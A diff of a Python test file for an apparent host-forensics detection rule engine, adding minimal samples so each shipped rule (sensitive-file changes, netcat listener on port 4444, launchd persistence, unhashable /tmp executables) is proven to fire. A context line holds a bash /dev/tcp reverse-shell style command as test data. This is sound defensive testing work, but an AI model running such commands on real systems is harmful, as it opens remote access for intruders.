@@ -204,3 +204,69 @@ def test_list_values_matching():
     assert run(r, [{"pid": 1, "cmdline": ["bash", "-c", "x > /dev/tcp/1.2.3.4/1"]}])[0]
     assert run(r, [{"pid": 1, "cmdline": ["ls"]}])[0] == []
     assert run(r, [{"pid": 1}])[0] == []  # missing field: no match, no crash
+
+
+# One minimal record set per shipped rule that the synthetic case does not trigger. Together with
+# the synthetic case this proves every rule's conditions can actually be satisfied.
+POSITIVE_SAMPLES = {
+    "MIR-FILE-003": (
+        {"files": [{"kind": "sensitive_file", "path": "/etc/sudoers", "uid": 501}]},
+        None,
+    ),
+    "MIR-FILE-004": (
+        {"files": [{"kind": "sensitive_file", "path": "/etc/hosts", "sha256": "b" * 64}]},
+        {"files": [{"kind": "sensitive_file", "path": "/etc/hosts", "sha256": "a" * 64}]},
+    ),
+    "MIR-NET-001": (
+        {"network": [{"kind": "socket", "state": "LISTEN", "proto": "tcp", "local_port": 4444, "process": "nc"}]},
+        {"network": []},
+    ),
+    "MIR-PERS-006": (
+        {
+            "persistence": [
+                {
+                    "kind": "launchd_plist",
+                    "path": "/Library/LaunchDaemons/x.plist",
+                    "sha256": "b" * 64,
+                    "exec_sha256": "c" * 64,
+                }
+            ]
+        },
+        {
+            "persistence": [
+                {
+                    "kind": "launchd_plist",
+                    "path": "/Library/LaunchDaemons/x.plist",
+                    "sha256": "a" * 64,
+                    "exec_sha256": "c" * 64,
+                }
+            ]
+        },
+    ),
+    "MIR-PROC-003": (
+        {"processes": [{"pid": 4242, "name": "x", "exe": "/private/tmp/x", "exe_hash_error": "permission denied"}]},
+        None,
+    ),
+}
+
+
+def _docs(sample):
+    return {name: {"records": recs, "status": "ok"} for name, recs in sample.items()}
+
+
+def test_every_shipped_rule_has_a_firing_test():
+    arts, _ = load_evidence(CASE)
+    base, _ = load_evidence(BASE)
+    rules = load_rules(RULES)
+    fired = {f.rule_id for f in evaluate(rules, arts, base)[0]}
+    uncovered = {r.id for r in rules} - fired - set(POSITIVE_SAMPLES)
+    assert not uncovered, f"add a positive sample for: {sorted(uncovered)}"
+
+
+@pytest.mark.parametrize("rule_id", sorted(POSITIVE_SAMPLES))
+def test_untriggered_rule_fires_on_minimal_sample(rule_id):
+    current, baseline = POSITIVE_SAMPLES[rule_id]
+    rules = [r for r in load_rules(RULES) if r.id == rule_id]
+    assert rules, rule_id
+    findings, notes = evaluate(rules, _docs(current), _docs(baseline) if baseline is not None else None)
+    assert [f.rule_id for f in findings if f.rule_id == rule_id], notes
